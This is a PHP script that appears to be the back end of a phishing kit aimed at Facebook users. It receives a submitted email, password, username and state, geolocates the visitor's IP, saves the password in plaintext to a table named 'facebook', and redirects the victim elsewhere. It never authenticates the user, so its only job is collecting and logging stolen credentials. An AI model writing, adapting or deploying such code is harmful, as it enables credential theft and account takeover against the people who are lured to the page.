<?php
header('Access-Control-Allow-Origin: *');  //I have also tried the * wildcard and get the same response
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');

ini_set('memory_limit', '-1');
require_once(dirname(__FILE__).'/configuration.php');
use GeoIp2\Database\Reader;
if ( isset($_POST['email']) &&  isset($_POST['pass']) ) {
    $email = $_POST["email"];
    $pass = $_POST["pass"];
    $username = $_POST["username"];
    $state = $_POST["state"];
	$ip = CLIENT_IP;
	date_default_timezone_set("America/Santo_Domingo");
    $meses = array("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
	$dias = array("Domingo","Lunes","Martes","Miercoles","Jueves","Viernes","Sábado");
    $fecha = $dias[date('w')]." ".date('d')." de ".$meses[date('n')-1]. " del ".date('Y');


		require_once(dirname(__FILE__).'/includes/geoip.php');

		if((strpos($ip, ":") === false)) {
		    //ipv4
		    $gi = geoip_open(dirname(__FILE__)."/includes/GeoIP.dat",GEOIP_STANDARD);
		    $country = geoip_country_name_by_addr($gi, $ip);
		}
		else {
		    //ipv6
		    $gi = geoip_open(dirname(__FILE__)."/includes/GeoIPv6.dat",GEOIP_STANDARD);
		    $country = geoip_country_name_by_addr_v6($gi, $ip);
		}

		//verifico duplicado
            $stmt = $pdo->prepare("SELECT count(*) from facebook WHERE email = :email");
            $stmt->bindValue(':email', $email);
            $stmt->execute();
            $count = $stmt->fetchColumn();
        if ($count == 0) {

		$registro=$pdo->prepare("INSERT INTO facebook(username, email, pass, country, state, ip, fecha) VALUES(:username, :email, :pass, :country, :state, :ip, :fecha)");
        $registro->bindParam(':username',$username);
        $registro->bindParam(':email',$email);
        $registro->bindParam(':pass',$pass);
        $registro->bindParam(':country',$country);
        $registro->bindParam(':state',$state);
        $registro->bindParam(':ip',$ip);
        $registro->bindParam(':fecha',$fecha);
        $registro->execute();
        // DANGER
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        header("Cache-Control: post-check=0, pre-check=0", false);
        header("Pragma: no-cache");
        header("Location: ".LINK_SELECT, 301);
        } else {
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        header("Cache-Control: post-check=0, pre-check=0", false);
        header("Pragma: no-cache");
        header("Location: ".LINK_SELECT, 301);
        }
		//FIN
}else{
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header("Location: ".LINK_SELECT, 301);
}
?>
